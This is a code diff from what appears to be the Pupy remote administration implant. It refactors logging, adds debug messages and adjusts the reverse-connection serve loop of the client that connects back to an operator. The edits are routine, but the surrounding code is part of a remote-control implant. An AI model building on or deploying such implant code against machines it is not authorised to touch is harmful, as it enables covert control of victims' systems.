@@ -52,6 +52,7 @@ socket.setdefaulttimeout(60)
 import time
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute
+
 import threading
 import traceback
 import os
@@ -59,11 +60,18 @@ import json
 import platform
 import random
 import argparse
+
 from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
+
 import logging
+
+logging.basicConfig()
+logger = logging.getLogger('pp')
+logger.setLevel(logging.WARNING)
+
 import shlex
 import zlib
 import signal
@@ -85,12 +93,9 @@ except ImportError:
     pass
 
 except Exception as e:
-    logging.warning(e)
+    logger.warning(e)
 
 import umsgpack
-
-logging.getLogger().setLevel(logging.WARNING)
-
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 pupy.namespace = None
@@ -115,6 +120,7 @@ def print_exception(tag=''):
 
     if remote_print_error:
         try:
+            dprint('Remote error: {}'.format(error))
             remote_print_error(error)
         except:
             pass
@@ -123,7 +129,7 @@ def print_exception(tag=''):
         dprint(error)
     elif debug:
         try:
-            logging.error(error)
+            logger.error(error)
         except:
             print error
 
@@ -645,11 +651,11 @@ def main():
             config_file = pupy.get_pupy_config()
             exec config_file in globals()
         except ImportError, e:
-            logging.warning(
+            logger.warning(
                 "ImportError: Couldn't load pupy config: {}".format(e))
 
     if LAUNCHER not in conf.launchers:
-        exit("No such launcher: %s" % LAUNCHER)
+        sys.exit("No such launcher: %s" % LAUNCHER)
 
     if debug:
         logging.getLogger().setLevel(logging.DEBUG)
@@ -697,7 +703,7 @@ def rpyc_loop(launcher):
     global attempt
     global debug
 
-    stream=None
+    stream = None
     for ret in launcher.iterate():
         try:
             pupy.connected = False
@@ -722,7 +728,7 @@ def rpyc_loop(launcher):
                 def check_timeout(event, cb, timeout=60):
                     time.sleep(timeout)
                     if not event.is_set():
-                        logging.error('timeout occured!')
+                        logger.error('timeout occured!')
                         cb()
 
                 event = threading.Event()
@@ -736,21 +742,24 @@ def rpyc_loop(launcher):
                 conn = None
 
                 try:
+                    logger.debug('Starting pupy connection')
                     conn = PupyConnection(
                         lock, None, ReverseSlaveService,
                         PupyChannel(stream), config={},
                         ping=stream.KEEP_ALIVE_REQUIRED
                     )
+                    logger.debug('Initialize connection')
                     conn._init_service()
+                    logger.debug('Initialize complete')
                 finally:
                     event.set()
 
                 attempt = 0
-                lastping = None
 
-                with lock:
-                    pupy.connected = True
-                    while not conn.closed:
+                pupy.connected = True
+                logger.debug('Serve')
+                while not conn.closed:
+                    with lock:
                         conn.serve()
 
         except SystemExit:
